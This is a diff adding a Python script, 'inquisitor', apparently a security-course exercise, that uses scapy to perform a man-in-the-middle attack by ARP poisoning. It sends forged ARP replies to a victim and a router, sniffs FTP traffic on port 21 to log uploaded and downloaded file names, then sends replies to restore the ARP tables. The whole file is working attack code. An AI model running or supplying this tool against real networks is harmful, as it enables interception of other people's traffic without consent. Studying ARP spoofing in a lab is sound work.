@@ -1,0 +1,83 @@
+#!/usr/bin/env python3
+
+import re
+import time
+import argparse
+
+import scapy.all as scapy
+
+scapy.load_layer("http")
+
+def valid_ip(ip: str) -> bool:
+    if not re.match(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$', ip):
+        print(f'Error: "{ip}" is not a valid IP address')
+        return False
+    return True
+
+def valid_mac(mac: str) -> bool:
+    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
+        print(f'Error: "{mac}" is not a valid MAC address')
+        return False
+    return True
+
+def get_mac_from_ip(ip: str) -> str:
+    assert(valid_ip(ip))
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_layer = scapy.ARP(pdst=ip)
+    entire_packet = broadcast / arp_layer
+    answer = scapy.srp(entire_packet, timeout=2, verbose=False)[0]
+    target_mac_address = answer[0][1].hwsrc
+    return target_mac_address
+
+def spoof_address(pdst: str, psrc: str, macsrc: str = ''):
+    assert(valid_ip(pdst))
+    assert(valid_ip(psrc))
+    mactarget = get_mac_from_ip(pdst)
+    if macsrc:
+        assert(valid_mac(macsrc))
+        packet = scapy.ARP(op=2, hwdst=mactarget, pdst=pdst, psrc=psrc, hwsrc=macsrc)
+    else:
+        packet = scapy.ARP(op=2, hwdst=mactarget, pdst=pdst, psrc=psrc)
+    scapy.send(packet, verbose=False)
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(
+        prog='inquisitor',
+        description='Perform MitM attack using ARP poisoning',
+    )
+    parser.add_argument('ipsrc', help='server/router IP address')
+    parser.add_argument('macsrc', help='server/router MAC address')
+    parser.add_argument('iptarget', help='victim IP address')
+    parser.add_argument('mactarget', help='victim MAC address')
+    args = parser.parse_args()
+    ipsrc = args.ipsrc
+    macsrc = args.macsrc
+    iptarget = args.iptarget
+    mactarget = args.mactarget
+    assert(valid_ip(ipsrc))
+    assert(valid_ip(iptarget))
+    assert(valid_mac(macsrc))
+    assert(valid_mac(mactarget))
+
+    print("Starting attack")
+
+    spoof_address(iptarget, ipsrc)
+    spoof_address(ipsrc, iptarget)
+
+    # def filter_get_requests(pkg):
+    #     return pkg.haslayer(HTTPRequest) and pkg[HTTPRequest].Method==b'GET'
+    # cap = scapy.sniff(lfilter=filter_get_requests)
+    # print(cap.summary())
+    def handler(pkt):
+        if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
+            payload = pkt[scapy.Raw].load
+            if payload[:5] == b'RETR ':
+                print(f'Downloading: {payload.decode()[5: -2]}')
+            elif payload[:5] == b'STOR ':
+                print(f'Uploading: {payload.decode()[5: -2]}')
+    scapy.sniff(prn=handler, filter='tcp port 21')
+
+    macsrc = get_mac_from_ip(iptarget)
+    mactarget = get_mac_from_ip(ipsrc)
+    spoof_address(iptarget, ipsrc, macsrc)
+    spoof_address(ipsrc, iptarget, mactarget)
